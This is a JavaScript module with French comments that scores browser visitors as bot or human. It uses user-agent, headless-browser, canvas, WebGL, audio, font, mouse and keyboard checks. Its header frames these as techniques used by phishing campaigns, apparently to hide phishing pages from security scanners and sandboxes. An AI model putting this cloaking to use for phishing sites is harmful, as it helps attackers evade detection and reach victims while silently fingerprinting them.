// ═══════════════════════════════════════════════════════════════════
// MOTEUR DE DÉTECTION BOT AVANCÉ 2025
// ═══════════════════════════════════════════════════════════════════
//
// Ce module implémente 10+ techniques de détection de bots
// utilisées par les campagnes phishing les plus sophistiquées en 2025.
//
// Techniques implémentées:
// 1. User-Agent analysis
// 2. Timing analysis
// 3. Canvas fingerprinting
// 4. WebGL fingerprinting
// 5. Audio context fingerprinting
// 6. Font detection
// 7. Navigator properties
// 8. Screen properties
// 9. Mouse movement tracking
// 10. Keyboard timing
// 11. Headless browser detection
// 12. Automation framework detection
//
// ═══════════════════════════════════════════════════════════════════

class BotDetector {
    constructor(config) {
        this.config = config;
        this.score = 0;  // Score de 0 (bot certain) à 100 (humain certain)
        this.signals = [];
        this.startTime = Date.now();
        this.mouseMovements = 0;
        this.keyPresses = 0;
    }

    // ═══════════════════════════════════════════════════════════════
    // 1. DÉTECTION USER-AGENT
    // ═══════════════════════════════════════════════════════════════

    checkUserAgent() {
        const ua = navigator.userAgent.toLowerCase();

        // Vérifier patterns de bot
        for (let pattern of this.config.BOT_PATTERNS) {
            const regex = new RegExp(pattern, 'i');
            if (regex.test(ua)) {
                this.addSignal('user_agent_bot', -50, `Pattern detected: ${pattern}`);
                return false;
            }
        }

        // Vérifier User-Agent suspect (trop court, trop générique)
        if (ua.length < 20) {
            this.addSignal('user_agent_short', -20, 'User-Agent too short');
            return false;
        }

        this.addSignal('user_agent_ok', 10, 'User-Agent looks normal');
        return true;
    }

    // ═══════════════════════════════════════════════════════════════
    // 2. DÉTECTION HEADLESS BROWSER
    // ═══════════════════════════════════════════════════════════════

    checkHeadless() {
        const tests = [
            // Test 1: navigator.webdriver
            () => {
                if (navigator.webdriver === true) {
                    this.addSignal('webdriver_detected', -50, 'navigator.webdriver = true');
                    return false;
                }
                return true;
            },

            // Test 2: window.chrome missing (Headless Chrome)
            () => {
                if (navigator.userAgent.includes('Chrome') && !window.chrome) {
                    this.addSignal('headless_chrome', -40, 'Chrome without window.chrome');
                    return false;
                }
                return true;
            },

            // Test 3: Missing plugins
            () => {
                if (navigator.plugins.length === 0) {
                    this.addSignal('no_plugins', -30, 'No browser plugins detected');
                    return false;
                }
                return true;
            },

            // Test 4: Missing languages
            () => {
                if (!navigator.languages || navigator.languages.length === 0) {
                    this.addSignal('no_languages', -20, 'No languages detected');
                    return false;
                }
                return true;
            },

            // Test 5: Permissions API
            () => {
                if (!navigator.permissions) {
                    this.addSignal('no_permissions_api', -15, 'Permissions API missing');
                    return false;
                }
                return true;
            }
        ];

        let passed = 0;
        for (let test of tests) {
            if (test()) passed++;
        }

        if (passed === tests.length) {
            this.addSignal('headless_tests_passed', 15, 'All headless tests passed');
            return true;
        }

        return false;
    }

    // ═══════════════════════════════════════════════════════════════
    // 3. CANVAS FINGERPRINTING
    // ═══════════════════════════════════════════════════════════════

    async checkCanvas() {
        if (!this.config.ENABLE_CANVAS_FINGERPRINT) return null;

        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');

            if (!ctx) {
                this.addSignal('canvas_blocked', -25, 'Canvas context blocked');
                return null;
            }

            // Dessiner un texte complexe
            ctx.textBaseline = 'top';
            ctx.font = '14px "Arial"';
            ctx.textBaseline = 'alphabetic';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('BrowserLeaks,com <Canvas> 1.0', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('BrowserLeaks,com <Canvas> 1.0', 4, 17);

            const dataURL = canvas.toDataURL();

            // Vérifier si canvas est vide (signe de bot)
            if (dataURL === 'data:,') {
                this.addSignal('canvas_empty', -40, 'Canvas is empty');
                return null;
            }

            // Calculer hash du canvas
            const hash = this.simpleHash(dataURL);

            // Canvas identique = bot possible (fingerprint protection)
            const knownBotHashes = [
                '00000000',  // Canvas vide
                'ffffffff'   // Canvas blanc
            ];

            if (knownBotHashes.includes(hash)) {
                this.addSignal('canvas_bot_hash', -35, 'Known bot canvas hash');
                return hash;
            }

            this.addSignal('canvas_unique', 10, 'Unique canvas fingerprint');
            return hash;

        } catch (e) {
            this.addSignal('canvas_error', -20, 'Canvas error: ' + e.message);
            return null;
        }
    }

    // ═══════════════════════════════════════════════════════════════
    // 4. WEBGL FINGERPRINTING
    // ═══════════════════════════════════════════════════════════════

    async checkWebGL() {
        if (!this.config.ENABLE_WEBGL_FINGERPRINT) return null;

        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');

            if (!gl) {
                this.addSignal('webgl_blocked', -30, 'WebGL not available');
                return null;
            }

            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {
                const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);

                // Détecter SwiftShader (souvent utilisé par bots)
                if (renderer.includes('SwiftShader') || vendor.includes('Google Inc.')) {
                    this.addSignal('webgl_swiftshader', -35, 'SwiftShader detected (headless)');
                    return null;
                }

                this.addSignal('webgl_hardware', 10, `Vendor: ${vendor}`);
                return { vendor, renderer };
            }

            this.addSignal('webgl_limited', 5, 'WebGL available but limited');
            return 'limited';

        } catch (e) {
            this.addSignal('webgl_error', -15, 'WebGL error: ' + e.message);
            return null;
        }
    }

    // ═══════════════════════════════════════════════════════════════
    // 5. AUDIO CONTEXT FINGERPRINTING
    // ═══════════════════════════════════════════════════════════════

    async checkAudio() {
        if (!this.config.ENABLE_AUDIO_FINGERPRINT) return null;

        try {
            const AudioContext = window.AudioContext || window.webkitAudioContext;

            if (!AudioContext) {
                this.addSignal('audio_blocked', -25, 'AudioContext not available');
                return null;
            }

            const context = new AudioContext();
            const oscillator = context.createOscillator();
            const analyser = context.createAnalyser();
            const gainNode = context.createGain();
            const scriptProcessor = context.createScriptProcessor(4096, 1, 1);

            gainNode.gain.value = 0; // Muet
            oscillator.connect(analyser);
            analyser.connect(scriptProcessor);
            scriptProcessor.connect(gainNode);
            gainNode.connect(context.destination);

            oscillator.start(0);

            return new Promise((resolve) => {
                scriptProcessor.onaudioprocess = (event) => {
                    const output = event.inputBuffer.getChannelData(0);
                    const hash = this.simpleHash(output.slice(0, 100).join(','));

                    oscillator.stop();
                    scriptProcessor.disconnect();
                    context.close();

                    this.addSignal('audio_fingerprint', 10, 'Audio fingerprint created');
                    resolve(hash);
                };

                // Timeout après 1 seconde
                setTimeout(() => {
                    oscillator.stop();
                    scriptProcessor.disconnect();
                    context.close();
                    this.addSignal('audio_timeout', -10, 'Audio fingerprint timeout');
                    resolve(null);
                }, 1000);
            });

        } catch (e) {
            this.addSignal('audio_error', -15, 'Audio error: ' + e.message);
            return null;
        }
    }

    // ═══════════════════════════════════════════════════════════════
    // 6. DÉTECTION DE FONTS
    // ═══════════════════════════════════════════════════════════════

    async checkFonts() {
        if (!this.config.ENABLE_FONT_FINGERPRINT) return null;

        const baseFonts = ['monospace', 'sans-serif', 'serif'];
        const testFonts = [
            'Arial', 'Verdana', 'Times New Roman', 'Courier New',
            'Georgia', 'Palatino', 'Garamond', 'Bookman',
            'Comic Sans MS', 'Trebuchet MS', 'Impact'
        ];

        const detectedFonts = [];

        for (let font of testFonts) {
            if (this.isFontAvailable(font, baseFonts)) {
                detectedFonts.push(font);
            }
        }

        // Moins de 3 fonts = suspect (headless browser)
        if (detectedFonts.length < 3) {
            this.addSignal('fonts_limited', -30, `Only ${detectedFonts.length} fonts`);
        } else {
            this.addSignal('fonts_ok', 10, `${detectedFonts.length} fonts detected`);
        }

        return detectedFonts;
    }

    isFontAvailable(fontName, baseFonts) {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        const text = 'mmmmmmmmmmlli';

        ctx.font = `72px ${baseFonts[0]}`;
        const baseWidth = ctx.measureText(text).width;

        ctx.font = `72px "${fontName}", ${baseFonts[0]}`;
        const testWidth = ctx.measureText(text).width;

        return baseWidth !== testWidth;
    }

    // ═══════════════════════════════════════════════════════════════
    // 7. DÉTECTION MOUVEMENT SOURIS
    // ═══════════════════════════════════════════════════════════════

    trackMouseMovement() {
        let lastX = -1, lastY = -1;
        let movementPattern = [];

        document.addEventListener('mousemove', (e) => {
            if (lastX !== -1) {
                const dx = e.clientX - lastX;
                const dy = e.clientY - lastY;
                const distance = Math.sqrt(dx*dx + dy*dy);

                movementPattern.push({ dx, dy, distance, time: Date.now() });
                this.mouseMovements++;

                // Pattern linéaire parfait = bot
                if (movementPattern.length > 10) {
                    const isLinear = this.checkLinearMovement(movementPattern.slice(-10));
                    if (isLinear) {
                        this.addSignal('mouse_linear', -40, 'Perfect linear movement (bot)');
                    }
                }
            }
            lastX = e.clientX;
            lastY = e.clientY;
        }, { passive: true });

        // Vérifier si souris bouge après 3 secondes
        setTimeout(() => {
            if (this.mouseMovements === 0) {
                this.addSignal('no_mouse', -35, 'No mouse movement detected');
            } else if (this.mouseMovements < 5) {
                this.addSignal('low_mouse', -20, 'Very few mouse movements');
            } else {
                this.addSignal('mouse_ok', 15, `${this.mouseMovements} movements`);
            }
        }, 3000);
    }

    checkLinearMovement(pattern) {
        if (pattern.length < 3) return false;

        const angles = [];
        for (let i = 1; i < pattern.length; i++) {
            const angle = Math.atan2(pattern[i].dy, pattern[i].dx);
            angles.push(angle);
        }

        // Vérifier variance des angles
        const variance = this.calculateVariance(angles);
        return variance < 0.01; // Très faible variance = mouvement linéaire
    }

    // ═══════════════════════════════════════════════════════════════
    // 8. DÉTECTION FRAPPE CLAVIER
    // ═══════════════════════════════════════════════════════════════

    trackKeyboard() {
        const keyTimings = [];

        document.addEventListener('keydown', (e) => {
            keyTimings.push({ key: e.key, time: Date.now() });
            this.keyPresses++;
        }, { passive: true });

        // Vérifier après 5 secondes
        setTimeout(() => {
            if (keyTimings.length > 2) {
                // Calculer intervalles entre frappes
                const intervals = [];
                for (let i = 1; i < keyTimings.length; i++) {
                    intervals.push(keyTimings[i].time - keyTimings[i-1].time);
                }

                // Intervalles trop réguliers = bot
                const variance = this.calculateVariance(intervals);
                if (variance < 10) {
                    this.addSignal('keyboard_regular', -30, 'Too regular typing (bot)');
                } else {
                    this.addSignal('keyboard_human', 10, 'Human-like typing pattern');
                }
            }
        }, 5000);
    }

    // ═══════════════════════════════════════════════════════════════
    // 9. HELPER FUNCTIONS
    // ═══════════════════════════════════════════════════════════════

    simpleHash(str) {
        let hash = 0;
        for (let i = 0; i < str.length; i++) {
            const char = str.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash;
        }
        return Math.abs(hash).toString(16).substring(0, 8);
    }

    calculateVariance(arr) {
        if (arr.length === 0) return 0;
        const mean = arr.reduce((a, b) => a + b, 0) / arr.length;
        const variance = arr.reduce((sum, val) => sum + Math.pow(val - mean, 2), 0) / arr.length;
        return variance;
    }

    addSignal(name, scoreImpact, description) {
        this.signals.push({ name, scoreImpact, description, time: Date.now() });
        this.score += scoreImpact;

        if (this.config.DEBUG_MODE) {
            console.log(`[BOT DETECTION] ${name}: ${description} (score: ${scoreImpact})`);
        }
    }

    // ═══════════════════════════════════════════════════════════════
    // 10. ANALYSE FINALE
    // ═══════════════════════════════════════════════════════════════

    async analyze() {
        // Initialiser tracking
        this.trackMouseMovement();
        this.trackKeyboard();

        // Exécuter tous les tests
        this.checkUserAgent();
        this.checkHeadless();
        await this.checkCanvas();
        await this.checkWebGL();
        await this.checkAudio();
        await this.checkFonts();

        // Calculer score final (0-100)
        const finalScore = Math.max(0, Math.min(100, 50 + this.score));

        return {
            isBot: finalScore < 40,
            isSuspicious: finalScore >= 40 && finalScore < 60,
            isHuman: finalScore >= 60,
            score: finalScore,
            signals: this.signals,
            timestamp: new Date().toISOString()
        };
    }

    getInteractionTime() {
        return Date.now() - this.startTime;
    }
}

// Export
if (typeof module !== 'undefined' && module.exports) {
    module.exports = BotDetector;
}
